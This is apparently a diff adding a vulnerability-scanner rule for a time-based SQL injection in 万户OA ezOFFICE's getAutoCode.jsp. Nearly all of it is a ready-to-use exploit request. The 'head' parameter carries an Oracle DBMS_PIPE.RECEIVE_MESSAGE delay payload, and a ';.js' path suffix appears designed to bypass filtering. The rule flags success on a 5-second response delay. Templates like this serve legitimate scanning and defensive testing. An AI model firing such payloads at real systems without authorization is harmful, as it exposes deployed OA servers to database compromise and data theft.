@@ -1,0 +1,11 @@
+name: 万户OA-ezOFFICE-getAutoCode-SQL注入
+description: >
+  SQL延时注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/defaultroot/platform/custom/customizecenter/js/getAutoCode.jsp;.js?pageId=1&head=2%27+AND+6205%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2898%29%7C%7CCHR%2866%29%7C%7CCHR%2890%29%7C%7CCHR%28108%29%2C8%29--+YJdO&field=field_name&tabName=tfield"
+    expression:
+      status: 200
+      sleep: 5
